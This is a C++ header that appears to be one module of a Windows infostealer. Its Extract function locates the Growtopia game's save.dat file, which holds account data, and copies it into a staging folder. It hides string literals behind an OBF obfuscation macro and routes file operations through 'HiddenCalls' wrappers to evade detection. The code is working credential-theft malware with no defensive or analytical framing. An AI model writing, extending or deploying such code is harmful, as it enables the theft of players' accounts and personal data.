#ifndef GROWTOPIA_HPP
#define GROWTOPIA_HPP

#include <string>
#include <filesystem>
#include "Winapi_structs.hpp"

namespace fs = std::filesystem;

namespace Growtopia {
    inline void Extract(const std::string& baseDir) {
        std::string growtopiaFolder = std::string(getenv(OBF("LOCALAPPDATA"))) + "\\" + OBF("Growtopia");
        std::string saveFile = growtopiaFolder + "\\" + OBF("save.dat");

        if (!fs::exists(saveFile)) return;

        std::string targetDir = baseDir + "\\" + OBF("Growtopia");
        HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);
        HiddenCalls::CopyFileA(saveFile.c_str(), (targetDir + "\\" + OBF("save.dat")).c_str(), FALSE);
    }
}

#endif
